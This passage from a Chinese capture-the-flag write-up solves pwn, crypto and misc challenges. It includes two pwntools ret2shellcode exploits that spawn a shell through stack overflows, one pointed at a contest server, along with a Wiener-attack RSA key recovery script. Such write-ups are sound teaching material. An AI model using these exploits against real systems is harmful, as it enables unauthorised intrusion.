<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = remote(&#x27;202.119.201.199&#x27;, 59991)</span></span><br><span class="line">p = process(<span class="string">&#x27;./q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">buf2 = <span class="number">0x0804C060</span></span><br><span class="line">payload = p32(buf2+<span class="number">4</span>) + shellcode.ljust((<span class="number">0x64</span>-<span class="number">8</span>-<span class="number">4</span>), <span class="string">&#x27;A&#x27;</span>) + p32(buf2+<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h3><h4 id="where-1"><a href="#where-1" class="headerlink" title="where"></a>where</h4><p>写name至可执行bss段。</p>
<p><img src="https://img-blog.csdnimg.cn/20190508153040459.png" alt="id"></p>
<p><img src="https://img-blog.csdnimg.cn/2019050815310259.png" alt="bss"></p>
<p><img src="https://img-blog.csdnimg.cn/20190508153600119.png" alt="vmmap"></p>
<p>存在栈溢出。</p>
<p><img src="https://img-blog.csdnimg.cn/20190508153958715.png" alt="echo1"></p>
<h4 id="how-1"><a href="#how-1" class="headerlink" title="how"></a>how</h4><p>ret2shellcode</p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;202.119.201.199&#x27;</span>, <span class="number">59993</span>)<span class="comment">#process(&#x27;./pwn3&#x27;)</span></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(asm(<span class="string">&#x27;jmp rsp&#x27;</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(<span class="number">0x6020a0</span>) + shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="古典密码签到"><a href="#古典密码签到" class="headerlink" title="古典密码签到"></a>古典密码签到</h3><p>一看就是 Hex 编码，直接 Hackbar 解码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密文：juttaigykhpmjyreca</span><br><span class="line">密钥：cumt</span><br></pre></td></tr></table></figure>

<p>一个密文，一个密钥，古典密码，猜测是维吉尼亚密码。然后直接在线解下</p>
<p><img src="https://s2.ax1x.com/2019/05/02/EYzFSg.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hahayoufindtheflag&#125;</span><br></pre></td></tr></table></figure>

<h3 id="现代密码签到"><a href="#现代密码签到" class="headerlink" title="现代密码签到"></a>现代密码签到</h3><p>密文一看就是 bas64 编码，密钥我原来以为就是就是那个，数了下有 16 个字符，那就是 128 bit，尝试 AES、3DES、RC4 解密均失败。后来才发现是经过两次 base64 编码的结果。后来数了下，密文是 26 个字符，不是 8 的整数倍那种，猜测是序列密码，序列密码最常见的是 RC4，所以先试试 RC4解密，直接用 pycrypto 解密，：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#Stream Cipher: RC4</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;zSLWE5Fk7Sg3mlltw9l2N7dhuADvk2HvWYU=&quot;</span></span><br><span class="line">k = <span class="string">&quot;WTNWdGRHWnNZV2M9&quot;</span></span><br><span class="line">s = base64.b64decode(s)</span><br><span class="line">k = base64.b64decode(base64.b64decode(k))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(s)</span><br><span class="line"><span class="built_in">print</span> k</span><br><span class="line">rc4 = ARC4.new(k)</span><br><span class="line">plaintext = rc4.decrypt(s)</span><br><span class="line"><span class="built_in">print</span> plaintext</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">26</span><br><span class="line">cumtflag</span><br><span class="line">flag&#123;CumT_D0uB13_MooN_cTf&#125;</span><br></pre></td></tr></table></figure>

<h3 id="easyxor"><a href="#easyxor" class="headerlink" title="easyxor"></a>easyxor</h3><p>有 hint 后是送分题，直接上 Python 脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;**************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span>(<span class="params">n</span>):</span></span><br><span class="line">    msg = libnum.s2n(n)</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(msg)[<span class="number">2</span>:]:</span><br><span class="line">        k = k &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(i):</span><br><span class="line">            k = k ^ msg</span><br><span class="line">        <span class="keyword">if</span> k &gt;&gt; <span class="number">256</span>:</span><br><span class="line">            k = k ^ <span class="number">0x10000000000000000000000000000000000000000000000000000000000000365</span></span><br><span class="line">    <span class="comment"># return str(k)</span></span><br><span class="line">    <span class="keyword">return</span> libnum.n2s(k)</span><br><span class="line"></span><br><span class="line">s = <span class="number">113493740270492087381619361102311635177554834526932164090282635858419073655670</span></span><br><span class="line">s = libnum.n2s(s)</span><br><span class="line">cnt = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">str</span>(cnt)+<span class="string">&quot; try:&quot;</span></span><br><span class="line">    s = crypt(s)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> s:</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cnt += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ec33f669d2d659e2bc27dbffdf&#125;</span><br></pre></td></tr></table></figure>

<h3 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h3><p>给了一个 <code>.pyc</code> 文件，这里用到一个在线网站反编译：<a target="_blank" rel="noopener" href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
<p>稍微看下代码，直接写出对应编码函数的逆函数即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode1</span>(<span class="params">ans</span>):</span></span><br><span class="line">    ret = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ans:</span><br><span class="line">        y = <span class="built_in">ord</span>(x)-<span class="number">25</span></span><br><span class="line">        ret += <span class="built_in">chr</span>(y^<span class="number">36</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode2</span>(<span class="params">ans</span>):</span></span><br><span class="line">    ret = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ans:</span><br><span class="line">        y = <span class="built_in">ord</span>(x)^<span class="number">36</span></span><br><span class="line">        y -= <span class="number">36</span></span><br><span class="line">        ret += <span class="built_in">chr</span>(y)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode3</span>(<span class="params">ans</span>):</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32decode(ans)</span><br><span class="line"></span><br><span class="line">final = <span class="string">&#x27;LOQ2NJFYU5YH2WTUU5VHJIDXLJNVW2LQO52WS2L6PVUVW2TQLJNVSWLJUBN3E===&#x27;</span></span><br><span class="line"><span class="built_in">print</span> decode1(decode2(decode3(final)))</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b38e7b57c2eff432044984f53efdd4cf&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>题目给了一个 <code>.pem</code> 文件，里面有公钥信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQKBPJR+6zDQPEK6ZY+xAdHS</span><br><span class="line">/Sw69BJG2IrKGOMQ7mk6vdpFlR0F2ZuqiYy6MEXG+KDv9yCrayeV0Yw+JwoNozIB</span><br><span class="line">rTl74KXVk84FHmn6iYQceqtGjcb2frmkID0SBXgNBti1CNUOe/v6GeyXl0j3JPmn</span><br><span class="line">B1wy9BldH3vSS9FJr6DGIwKBgQGtbGUOVzO5qyoOMo+/bdqnxqA4NHjUciH+GDaU</span><br><span class="line">yKgjp4X47PFyHYc6HI0tyMmjxmo/nUXV7MTGVnk2lYoLuuSM8aNWyBgCdGf0bVxw</span><br><span class="line">UtmMyDqr6Z7GL6djTSiUtWIyi0duMsGrPPxOTfZRkbVgj/r0OopZIDbc+zDxHsNU</span><br><span class="line">wl2PXQ==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>

<p>看起来像 base64 ，应该这个文件还有一定结构，直接在线 decoder 解析下，链接：<a target="_blank" rel="noopener" href="https://report-uri.com/home/pem_decoder">https://report-uri.com/home/pem_decoder</a>。</p>
<p>发现这 <code>e</code> 很大呀，推测可以用低解密指数攻击（<strong>wiener attack</strong>），直接用 github 上别人的板子，链接：<a target="_blank" rel="noopener" href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a>。</p>
<p>写如下 Python 脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">10000000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span>(<span class="params">e,n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Finds d knowing (e,n)</span></span><br><span class="line"><span class="string">    applying the Wiener continued fraction attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d-<span class="number">1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d-<span class="number">1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=-<span class="number">1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x02813c947eeb30d03c42ba658fb101d1d2fd2c3af41246d88aca18e310ee693abdda45951d05d99baa898cba3045c6f8a0eff720ab6b2795d18c3e270a0da33201ad397be0a5d593ce051e69fa89841c7aab468dc6f67eb9a4203d1205780d06d8b508d50e7bfbfa19ec979748f724f9a7075c32f4195d1f7bd24bd149afa0c623</span></span><br><span class="line">e = <span class="number">0x01ad6c650e5733b9ab2a0e328fbf6ddaa7c6a0383478d47221fe183694c8a823a785f8ecf1721d873a1c8d2dc8c9a3c66a3f9d45d5ecc4c6567936958a0bbae48cf1a356c818027467f46d5c7052d98cc83aabe99ec62fa7634d2894b562328b476e32c1ab3cfc4e4df65191b5608ffaf43a8a592036dcfb30f11ec354c25d8f5d</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">c = libnum.s2n(c)</span><br><span class="line">d = hack_RSA(e,n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure>

<p>运行结果前面还有一堆奇奇怪怪的字符，在后面我们看到了 flag <code>ヾ(*・-・)ﾂ</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;62fe8a611728ca62b6a7cba837abacae&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Whoami"><a href="#Whoami" class="headerlink" title="Whoami???"></a>Whoami???</h3><p>打开题目进入懵逼状态：</p>
<p><img src="https://s2.ax1x.com/2019/05/02/EYxgWF.png" alt="img"></p>
<p>疯狂乱试都失败了。</p>
<p>F12 检查，转到【Network】标签看到：</p>
<p><img src="https://s2.ax1x.com/2019/05/02/EYxWQJ.png" alt="img"></p>
<p>好了，知道你是茶壶了，遂填入 <code>teapot</code> 得到 flag 。<del>等等，今天是劳动节不是愚人节呀！</del></p>
<h3 id="Lisp"><a href="#Lisp" class="headerlink" title="Lisp"></a>Lisp</h3><h4 id="先学一波语言"><a href="#先学一波语言" class="headerlink" title="先学一波语言"></a>先学一波语言</h4><h5 id="define"><a href="#define" class="headerlink" title="define"></a><code>define</code></h5><p>宏定义。</p>
<h5 id="append"><a href="#append" class="headerlink" title="append"></a><code>append</code></h5><p>列表连接。</p>
<h5 id="pair"><a href="#pair" class="headerlink" title="pair"></a><code>pair</code></h5><p>有序数对，包含两个元素。</p>
<h5 id="let"><a href="#let" class="headerlink" title="let"></a><code>let</code></h5><p><code>let</code> 是一个最常用的 Common Lisp 的操作符之一，它让你引入新的局部变量（local variable）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; (let ((x 1) (y 2))</span><br><span class="line">     (+ x y))</span><br><span class="line">3</span><br></pre></td></tr></table></figure>

<h5 id="car-amp-cdr"><a href="#car-amp-cdr" class="headerlink" title="car &amp; cdr"></a><code>car</code> &amp; <code>cdr</code></h5><p>取出列表元素的基本函数是 <code>car</code> 和 <code>cdr</code> 。对列表取 <code>car</code> 返回第一个元素，而对列表取 <code>cdr</code> 返回第一个元素之后的所有元素：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; (car &#x27;(a b c))</span><br><span class="line">A</span><br><span class="line">&gt; (cdr &#x27;(a b c))</span><br><span class="line">(B C)</span><br></pre></td></tr></table></figure>

<p>你可以把 <code>car</code> 与 <code>cdr</code> 混合使用来取得列表中的任何元素。如果我们想要取得第三个元素，我们可以：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (car (cdr (cdr &#x27;(a b c d))))</span><br><span class="line">C</span><br></pre></td></tr></table></figure>

<h5 id="cond"><a href="#cond" class="headerlink" title="cond"></a><code>cond</code></h5><p>语法是 ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(cond   (test1    action1)</span><br><span class="line">   (test2    action2)</span><br><span class="line">   ...</span><br><span class="line">   (testn   actionn))</span><br></pre></td></tr></table></figure>

<p>cond语句中的每个子句都包含条件测试和要执行的操作。类似 C 中的带 break 的 switch 。</p>
<p>如果cond，test1之后的第一个测试被评估为true，则执行相关的动作部分action1，返回其值，并跳过其余的子句。</p>
<p>如果test1的计算结果为nil，则控制将移至第二个子句而不执行action1，并遵循相同的过程。</p>
<p>如果没有任何测试条件被评估为真，则cond语句返回<strong>nil。</strong></p>
<h5 id="remainder"><a href="#remainder" class="headerlink" title="remainder"></a><code>remainder</code></h5><p>取余。</p>
<h4 id="理解代码"><a href="#理解代码" class="headerlink" title="理解代码"></a>理解代码</h4><p>然后对照着 Lisp 代码改写成 Python 代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">tab = [<span class="number">97</span>,<span class="number">100</span>,<span class="number">206</span>,<span class="number">218</span>,<span class="number">135</span>,<span class="number">230</span>,<span class="number">70</span>,<span class="number">242</span>,<span class="number">104</span>,<span class="number">107</span>,<span class="number">95</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">100</span>,<span class="number">206</span>,<span class="number">101</span>,<span class="number">218</span>,<span class="number">137</span>]</span><br><span class="line"></span><br><span class="line">iv_0 = <span class="number">0x0c</span></span><br><span class="line">iv_1 = <span class="number">0x2e</span></span><br><span class="line">iv_2 = <span class="number">0x3a</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> i*<span class="number">2</span>+iv_0</span><br><span class="line">    <span class="keyword">elif</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> i/<span class="number">2</span>+iv_1</span><br><span class="line">    <span class="keyword">elif</span> i &gt; <span class="number">90</span>:</span><br><span class="line">        <span class="keyword">return</span> i+iv_0</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> i+iv_2</span><br></pre></td></tr></table></figure>

<h4 id="Exploit-now"><a href="#Exploit-now" class="headerlink" title="Exploit now!"></a>Exploit now!</h4><p>写出 <code>conv()</code>  的逆函数，并结合正则表达式给的范围写出脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line">tab = [<span class="number">97</span>,<span class="number">100</span>,<span class="number">206</span>,<span class="number">218</span>,<span class="number">135</span>,<span class="number">230</span>,<span class="number">70</span>,<span class="number">242</span>,<span class="number">104</span>,<span class="number">107</span>,<span class="number">95</span>,<span class="number">104</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">100</span>,<span class="number">206</span>,<span class="number">101</span>,<span class="number">218</span>,<span class="number">137</span>]</span><br><span class="line">legal = <span class="string">r&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iv_0 = <span class="number">0x0c</span></span><br><span class="line">iv_1 = <span class="number">0x2e</span></span><br><span class="line">iv_2 = <span class="number">0x3a</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> i*<span class="number">2</span>+iv_0</span><br><span class="line">    <span class="keyword">elif</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> i/<span class="number">2</span>+iv_1</span><br><span class="line">    <span class="keyword">elif</span> i &gt; <span class="number">90</span>:</span><br><span class="line">        <span class="keyword">return</span> i+iv_0</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> i+iv_2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uncov</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (i-iv_0)%<span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> ((i-iv_0)/<span class="number">2</span>)%<span class="number">3</span> == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">chr</span>((i-iv_0)/<span class="number">2</span>) <span class="keyword">in</span> legal:</span><br><span class="line">        <span class="keyword">return</span> (i-iv_0)/<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> i-iv_0 &gt; <span class="number">90</span> <span class="keyword">and</span> <span class="built_in">chr</span>(i-iv_0) <span class="keyword">in</span> legal:</span><br><span class="line">        <span class="keyword">return</span> i-iv_0</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(i-iv_2) <span class="keyword">in</span> legal:</span><br><span class="line">        <span class="keyword">return</span> i-iv_2</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ord</span>(<span class="string">&quot;;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uncov_2</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (i-iv_1)*<span class="number">2</span> &lt; <span class="number">256</span> <span class="keyword">and</span> <span class="built_in">chr</span>((i-iv_1)*<span class="number">2</span>) <span class="keyword">in</span> legal:</span><br><span class="line">        <span class="keyword">return</span> (i-iv_1)*<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ord</span>(<span class="string">&quot;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">flag2 = <span class="string">&quot;&quot;</span></span><br><span class="line">l = <span class="built_in">len</span>(tab)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    flag += <span class="built_in">chr</span>(uncov(tab[i]))</span><br><span class="line">    flag2 += <span class="built_in">chr</span>(uncov_2(tab[i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"><span class="built_in">print</span> flag2</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;;ag&#123;m;s;_;;;_;a;g&#125;</span><br><span class="line">fl;;;;0;tzbtfzl;n;;</span><br></pre></td></tr></table></figure>

<p>然后手动七拼八凑拼成有意义的结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;m0st_btf_lang&#125;</span><br></pre></td></tr></table></figure>

<h3 id="猜？"><a href="#猜？" class="headerlink" title="猜？"></a>猜？</h3><p>题目给了一个加密的 <code>.zip</code> 文件，让我们猜密码？推测可能用了弱密钥，先不管三七二十一跑下字典。用工具秒破：</p>
